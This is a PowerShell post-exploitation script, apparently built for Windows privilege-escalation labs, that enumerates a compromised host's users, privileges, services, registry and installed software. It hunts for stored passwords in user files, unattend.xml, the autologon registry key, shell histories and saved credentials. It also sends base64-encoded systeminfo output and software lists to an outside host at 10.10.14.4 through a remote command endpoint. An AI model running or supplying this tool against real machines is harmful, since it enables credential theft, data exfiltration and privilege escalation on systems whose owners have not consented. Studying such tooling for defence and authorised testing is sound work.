$remote_check = "10.10.14.4"

function create_temp_dir{
  if ( -Not (Test-Path "C:\Windows\Temp\test")){
    New-Item -ItemType directory -Path C:\Windows\Temp\test 
}

}


function print_output($command){ 
  Write-Output " "
  Write-Output " "
  print_head($command)
  Write-Output "#    $command     #"
  print_head($command)
}

function print_head($command){ 
  $str = ""
  For ($i=0; $i -le $command.length + 10; $i++) {
    $str+="#"
}
Write-Output $str

}


function Is-ThisNumeric ($Value) {
  return $Value -match "^[\d\.]+$"
}

function Get-NetworkStatistics($customparam1=" ", $customparam2=" ")
{
 $properties = 'Protocol','LocalAddress','LocalPort'
 $properties += 'RemoteAddress','RemotePort','State','ProcessName','PID'

 netstat -ano |Select-String -Pattern '\s+(TCP|UDP)'  | Select-String $customparam1 | Select-String $customparam2 | ForEach-Object {

   $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)

   if($item[1] -notmatch '^\[::')
   {
     if (($la = $item[1] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')
     {
       $localAddress = $la.IPAddressToString
       $localPort = $item[1].split('\]:')[-1]
   }
   else
   {
       $localAddress = $item[1].split(':')[0]
       $localPort = $item[1].split(':')[-1]
   }

   if (($ra = $item[2] -as [ipaddress]).AddressFamily -eq 'InterNetworkV6')
   {
       $remoteAddress = $ra.IPAddressToString
       $remotePort = $item[2].split('\]:')[-1]
   }
   else
   {
       $remoteAddress = $item[2].split(':')[0]
       $remotePort = $item[2].split(':')[-1]
   }
   $pn = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name;
   if ($pn |  Select-String -Pattern "svchost","System","lsass","wininit","services" -Notmatch){
       New-Object PSObject -Property @{
         PID = $item[-1]
         ProcessName = (Get-Process -Id $item[-1] -ErrorAction SilentlyContinue).Name
         Protocol = $item[0]
         LocalAddress = $localAddress
         LocalPort = $localPort
         RemoteAddress =$remoteAddress
         RemotePort = $remotePort
         State = if($item[0] -eq 'tcp') {$item[3]} else {$null}
         } |Select-Object -Property $properties
     }

 }
}
}


function Get-OthersProcessStatistics
{
<#
   $properties = 'PID','ProcessName','ProcessPath', 'Status'

   tasklist /v  /fi "username ne $env:UserName" /fi "imagename ne smss.exe" /fi "imagename ne csrss.exe" /fi "imagename ne wininit.exe" /fi "imagename ne services.exe" /fi "imagename ne lsass.exe" /fi "imagename ne svchost.exe" /fi "imagename ne lsm.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne explorer.exe" /fi "imagename ne System Idle Process" |Select-String -Pattern '\d+(?!.*\d+)' | out-string -width  4096 | ForEach-Object {

     $item = $_.line.split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)
     $item_id  = if(Is-ThisNumeric($item[1])) {$item[1]} else {$item[2]}
     New-Object PSObject -Property @{
       PID = if(Is-ThisNumeric($item[1])) {$item[1]} else {$item[2]}
       ProcessName = wmic service  where "ProcessId = $item_id" get Name
       ProcessPath = wmic service  where "ProcessId = $item_id" get PathName
       Status = wmic service  where "ProcessId = $item_id" get State
       } |Select-Object -Property $properties
     }
     #>
     tasklist /v  /fi "username ne $env:UserName" /fi "imagename ne smss.exe" /fi "imagename ne csrss.exe" /fi "imagename ne wininit.exe" /fi "imagename ne services.exe" /fi "imagename ne lsass.exe" /fi "imagename ne svchost.exe" /fi "imagename ne lsm.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne explorer.exe" /fi "imagename ne System Idle Process" |Select-String -Pattern '\d+(?!.*\d+)' | out-string -width  4096
 }


 function IsWritable($path_to_check){ 

    $myuser = $env:UserName;
    $value_to_return = $false;

    if ((Get-Acl $path_to_check).access | ft | Out-String | findStr $myuser | Select-String -Pattern "Allow" |Select-String "(FullControl)|(Modify)|(Write)") {return $true;}

    $groups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups).Value | foreach-Object{
      $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); 
      try {
        Write-Output ($objSID.Translate( [System.Security.Principal.NTAccount])).Value  
    }
    catch {

    }
}  

$groups | ForEach-Object {
  $groupeName=$_;
  
  (Get-Acl $path_to_check).access | ForEach-Object{

    if ( $_ | ft | Out-String | Select-String -Pattern "Allow" | Select-String -Pattern $groupeName.replace("\","\\") | Select-String "(FullControl)|(Modify)|(Write)") {$value_to_return=$true; } 
}
}
return $value_to_return;
}

function GetSystemInfo{

    print_output("System detail")
    try{
      systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"  
      }catch {

      }    

      print_output("List all env variables")
      Get-ChildItem Env: | ft Key,Value

      Write-Output("Is this shell 64 bit : " + [environment]::Is64BitProcess)

      print_output("Listing drive")
      Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

      print_output("Checking computer information")
      net accounts

  }



  function GetUserGroup{

      print_output("Current user Local Group")

      $groups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups).Value | foreach-Object{
        $objSID = New-Object System.Security.Principal.SecurityIdentifier ($_); 
        try {
          Write-Output ($objSID.Translate( [System.Security.Principal.NTAccount])).Value  
      }
      catch {

      }
  }  

  Write-Output $groups

}



function GetUsersInfo{

  print_output("Checking Computer Users")
  # $response = Get-LocalUser -ErrorAction SilentlyContinue | ft Name,Enabled,LastLogon 
  cmd /c net users


  print_output("Checking Administrator group member")
  #Get-LocalGroupMember Administrators   -ErrorAction SilentlyContinue  | ft Name, PrincipalSource 
  #Get-LocalGroupMember Administrateurs  -ErrorAction SilentlyContinue  | ft Name, PrincipalSource

  cmd /c net localgroup Administrators

}

function CheckInsecureUserPermission{
  print_output("Checking Impersonate Privilege")
  whoami /priv | Select-String -Pattern '(SeSystemEnvironmentPrivilege)|(SeAssignPrimaryPrivilege)|(SeTcbPrivilege)|(SeBackupPrivilege)|(SeRestorePrivilege)|(SeCreateTokenPrivilege)|(SeLoadDriverPrivilege)|(SeTakeOwnershipPrivilege)|(SeDebugPrivilege)|(SeImpersonatePrivilege)' | Select-String -Pattern 'Enabled'

}  

function GetNetworkInfo{
  print_output("Network addresses")
  try {
    Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
    }catch {
      ipconfig
  }

  print_output("Localhost listening connections")
  Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING" | Format-Table

  print_output("Listening connections")
  Get-NetworkStatistics -customparam1 "LISTENING" | Format-Table

  print_output("Share listening")
  net share

}

function LootingForInterrestingFile{
    $c_dir = $ENV:UserProfile;
    print_output("Looting for passwords in $c_dir")
    try {
      Set-Location -Path $c_dir  -ErrorAction SilentlyContinue
  }
  catch {}
  findstr /SI /M 'user login pass pwd password key credential cred secret key'   *.xml *.ini *.txt | findStr /VI "^AppData"
  cmd /c "dir /S /B *user* == *login* == *pass* == *pwd* == *key* == *secret* == *cred* == *vnc* == *.config*" | findStr /V "AppData"

  print_output("Searching Password in   *unattended.xml *unattend.xml *unattend.txt *groups.xml, *confcons.xml")
  Get-Childitem -Path C:\  -Force -Include *unattended.xml,*unattend.xml,*groups.xml,*unattend.txt*,conf*.xml -File -Recurse -ErrorAction SilentlyContinue |ForEach-Object { Get-Content  $_   |  Select-String -Pattern 'Password'  }

  #print_output("Checking IIS Web config")
  #Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

  #print_output("Checking content of C:\inetpub\wwwroot")
  #Get-Childitem -Path C:\inetpub\wwwroot -ErrorAction SilentlyContinue
  #print_output("SNMP config")
  #Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -ErrorAction SilentlyContinue

  print_output("Checking saved wifi ")
  cmd /c "netsh wlan show profile"
  #for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on


}

function CheckingAutoLogin{
    print_output("Getting Auto-Login in Register")
    cmd /c 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"'   | findstr "DefaultUserName DefaultDomainName DefaultPassword" 

}

function GetPowerShellHistory{
    print_output("PowerShell history")
    cat (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    Get-History -ErrorAction SilentlyContinue
}  

function GetProcessInfo{
    print_output("Getting listening process localy")
    Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING"  | Format-Table

    print_output("Getting others listening process")
    Get-NetworkStatistics -customparam1 "127.0.0.1" -customparam2 "LISTENING"  | Format-Table

    print_output("Process running as another user")
    Get-OthersProcessStatistics

    print_output("Process running as current user")
    tasklist /v /fi "username eq $env:UserName" /fi "imagename ne smss.exe" /fi "imagename ne csrss.exe" /fi "imagename ne wininit.exe" /fi "imagename ne services.exe" /fi "imagename ne lsass.exe" /fi "imagename ne svchost.exe" /fi "imagename ne lsm.exe" /fi "imagename ne winlogon.exe" /fi "imagename ne explorer.exe" /fi "imagename ne System Idle Process"

}

function GetInstalledSoftwareInfo{
    print_output("Software installed on the computer")
    $my_result1 = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"  -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize
    $my_result1 | foreach-Object {$_}

    print_output("Software installed for the current user")
    $my_result2 = Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"  -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize
    $my_result2 | foreach-Object {$_}

    print_output("Non-Microsfot Software installed")
    $my_result3 = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Where-Object{$_.Publisher -NotMatch "Microsoft Corporation"} | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate  |  foreach-Object {Write-Output ($_.DisplayName  + " | " + $_.DisplayVersion )} | sort | Get-Unique
    $my_result3 | foreach-Object {$_}
}

function SearchSoftwareExploit{
    print_output("Searching Software exploit")
    $result =  Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Where-Object{($_.Publisher -NotMatch "Microsoft") -and ($_.DisplayName -NotMatch "^Microsoft|VMware Tools|^Java")} | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate  |  foreach-Object {Write-Output ($_.DisplayName  + " | " + $_.DisplayVersion )} | sort | Get-Unique
    foreach ( $r in $result){ 
      if($r.Split(" ")[0].length -gt 3 )
      {
        $search = $r.Split(" ")[0].replace('-', ' ') ; 
        Write-Output "Searchsploit $search"; 
        (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=searchsploit $search --colour" -UseBasicParsing).content;
        Write-Output " "}
    }
    

}  

function GetTasksInfo{
    print_output("Scheduled tasks")
    Get-ScheduledTask -ErrorAction SilentlyContinue | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State 

    print_output("Startup tasks")
    cmd /c wmic startup get caption,command
}  

function GetUnquotedServices{
    print_output("Unquoted Service Paths")
    Get-WmiObject -Class win32_service -Property Name, DisplayName, PathName, StartMode  -ErrorAction SilentlyContinue | Where-Object {$_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne "")} | Where-Object {-not $_.pathname.StartsWith("`"")} | Where-Object {-not $_.pathname.StartsWith("'")} | Where-Object {($_.pathname.Substring(0, $_.pathname.IndexOf(".exe") + 4)) -NotMatch "C:\\Windows\\"}

}

function GetWSLINfo{
    print_output("Checking Windows Subsystem for Linux")
    #wsl --list --verbose 
    Get-Childitem -Path C:\Windows\WinSxS -Include bash.exe -File -Recurse -ErrorAction SilentlyContinue

    Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss -ErrorAction SilentlyContinue |%{ Get-ItemProperty  $_.PSPath} |  out-string -width  4096
    $wsl_base_path = (Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss -ErrorAction SilentlyContinue |%{ Get-ItemProperty  $_.PSPath}).BasePath;

    print_output("Checking .bash_history file")
    $history_file = Get-Childitem -Path $wsl_base_path -Include '.bash_history' -File -Recurse -ErrorAction SilentlyContinue  | foreach-object{Write-Output ($_.DirectoryName+"\"+$_.Name)}
    foreach ($h in $history_file){
      Write-Output("########");
      Write-Output $h;
      Write-Output("########");
      Get-Content $h;
  }

}

function GetInsecuredPermissionInRegistry{
    print_output("Checking AlwaysInstallElevated in registry")
    Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
    Get-ItemProperty -Path "HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

    print_output("Checking editabled item in HKLM:\SYSTEM\CurrentControlset")
    get-childitem HKLM:\SYSTEM\CurrentControlset | Select PSChildName | foreach-Object {
     $current_path=Write-Output ("HKLM:\SYSTEM\CurrentControlset\"+$_.PSChildName);
     if (IsWritable($current_path)) { Write-Output $current_path}
 }
}


function GetRunAs{
  print_output("Checking Runas")
  cmdkey /list
}

function GetUnusualCDirectory{
  print_output("Listing unusual directory in C drive")
  Get-ChildItem "C:\" -Force| Where-Object {$_.Name -notmatch "Recycle" -and $_.Name -notmatch "Config.msi" -and $_.Name -notmatch "Documents and Settings" -and $_.Name -notmatch "Program files" -and $_.Name -notmatch "ProgramData" -and $_.Name -notmatch "Recovery" -and $_.Name -notmatch "System Volume Information" -and $_.Name -notmatch "Users" -and $_.Name -notmatch "Windows" -and $_.Name -notmatch "pagefile.sys" -and $_.Name -notmatch "swapfile.sys" -and $_.Name -notmatch "PerfLogs" -and $_.Name -notmatch "inetpub" -and $_.Name -notmatch "bootmgr"} -ErrorAction SilentlyContinue

}

function GetPotentialExploitableUserGroup {
  print_output("Listing potential exploitable user group")
  whoami /groups | findstr /I Admin
}

function GetKernelExploits{
    if( -not (Test-Path "C:\Windows\temp\test")){ mkdir C:\Windows\temp\test}
    # (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python3 wes.py -u" -UseBasicParsing).content;

    systeminfo > C:\Windows\temp\test\systeminfo.txt
    $fileName = "C:\Windows\temp\test\systeminfo.txt"
    $fileContent = get-content $fileName -Encoding UTF8 -Raw
    $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
    $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=echo $fileContentEncoded | base64 -d > systeminfo.txt" -UseBasicParsing).content;
    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=rm *.xls  " -UseBasicParsing).content; 
    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python windows-exploit-suggester.py -u " -UseBasicParsing).content; 
    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=/usr/bin/python2.7 windows-exploit-suggester.py -i systeminfo.txt -d  *.xls " -UseBasicParsing).content; 
    #$i = 'Elevation of Privilege';
    #(Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python3 wes.py systeminfo.txt -i $i --exploits-only  " -UseBasicParsing).content; 
}

function GetInsecureServices{
 print_output("Insecure services permissions")
 $Services = Get-WmiObject -Class win32_service -ErrorAction SilentlyContinue | Where-Object {$_}

 if ($Services) {
  ForEach ($Service in $Services){

    # try to change error control of a service to its existing value

    $Result = sc.exe config $($Service.Name) error= $($Service.ErrorControl)

    # means the change was successful
    if ($Result -contains "[SC] ChangeServiceConfig SUCCESS"){
      $Out = New-Object PSObject 
      $Out | Add-Member Noteproperty 'ServiceName' $Service.name
      $Out | Add-Member Noteproperty 'Path' $Service.pathname
      $Out | Add-Member Noteproperty 'StartName' $Service.startname
      #$Out | Add-Member Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -ServiceName '$($Service.name)'"
      $Out
  }
}
}
}

function GetHTTPDocWritableFolder{
    print_output("Checking writable httpd service folder");
    Get-ChildItem -Path C:\ -Recurse -Include "www","htdocs","wwwroot" -ErrorAction SilentlyContinue | foreach-Object{
        if (IsWritable($_.FullName)) { Write-Output ( $_.FullName + " is writable") }
    }
}


function GetAlternateDataStream{
    print_output("Checking alternate data stream");
    #Get-ChildItem -Path $env:USERPROFILE -recurse -ErrorAction SilentlyContinue | % { Get-Item $_.FullName -stream * -ErrorAction SilentlyContinue } | where stream -ne ':$Data'  | where stream -notMatch 'zone.identifier'
    Get-ChildItem -Path $env:USERPROFILE -Force  -recurse -ErrorAction SilentlyContinue | % { Get-Item $_.FullName -stream * -ErrorAction SilentlyContinue } | where stream -ne ':$Data'  | where stream -notMatch 'zone.identifier'
}
<#
  print_output("Insecure services permissions")
  $myuser = $env:UserName

  wmic service  where "Not StartName  like '%$myuser%'" Get PathName | Get-Unique |  where {$_ -ne "" -and $_ -match ":"} | foreach {write-output ($_.replace('"', '').toLower().Substring(0, $_.IndexOf(".exe") + 4)) } | sort | Get-Unique



  print_output("Hijacked dll")
  $processes = @{}
  Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object {$processes[$_.handle] = $_.getowner().user}
  #Processes not owned by current user
  $a = $processes | findStr /V  $env:UserName
  $candidate_id = $a[3..$a.count]  | Where-Object {$_.Trim().Length -ne 0}

  #Filter processes having real path
  $processes = foreach ($c in $candidate_id) { Get-Process -ID $c  | Where-Object {$_.path}}

  print_output("PATH directories with weak permissions")
  $paths_name = (Get-WmiObject win32_service |  ?{$_.PathName -notmatch 'C:\\Windows\\System32\\'}).PathName
  $user_group = Get-LocalGroup 

  $b =  ForEach($i in ( Get-WmiObject win32_service |  ?{$_.PathName -notmatch 'C:\\Windows\\System32\\'} ) ){ write-output $i.PathName; (Get-Acl  ($i.PathName.replace('"', '')  -split "\/")[0]  ).Access | Select FileSystemRights,AccessControlType,IdentityReference; write-output "";}

  Write-Output $b | findStr /V "NT AUTHORITY\SYSTEM" | findStr /V "BUILTIN\Administrators"





  #>
  
  GetSystemInfo
  
  
  GetUserGroup
  
  GetUsersInfo
  CheckInsecureUserPermission
  GetNetworkInfo
  LootingForInterrestingFile
  CheckingAutoLogin
  GetPowerShellHistory
  GetProcessInfo
  GetInstalledSoftwareInfo
  SearchSoftwareExploit
  GetTasksInfo
  GetUnquotedServices
  GetInsecureServices
  GetWSLINfo
  GetInsecuredPermissionInRegistry
  GetRunAs
  GetKernelExploits
  GetUnusualCDirectory
  GetPotentialExploitableUserGroup
  
  
  GetAlternateDataStream
  